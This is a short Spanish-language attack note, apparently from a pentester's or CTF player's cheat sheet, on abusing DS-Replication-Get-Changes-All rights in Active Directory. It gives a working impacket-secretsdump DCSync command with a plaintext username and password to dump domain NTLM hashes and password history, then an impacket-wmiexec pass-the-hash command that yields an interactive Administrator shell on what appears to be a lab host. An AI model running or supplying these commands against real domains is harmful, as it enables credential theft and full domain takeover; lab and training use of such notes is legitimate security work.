Cuando un usuario tiene privilegios en DS_Replication-Get-Changes-All en el dominio.

** Ataque **
> `impacket-secretsdump -just-dc mrlky:Football#7@10.10.10.103`
> Obtenemos los hashes NTML.
> Con el comando --history añadido podemos además ver los cambios históricos en las contraseñas de los usuarios. Se pueden crackear para ver si hay patrones.
> Copiar segunda parte del hash y utilizar:
> `impacket-wmiexec -hashes <hash> Administrator@10.10.10.103`
> Obtenemos shell interactiva como usuario Administrator.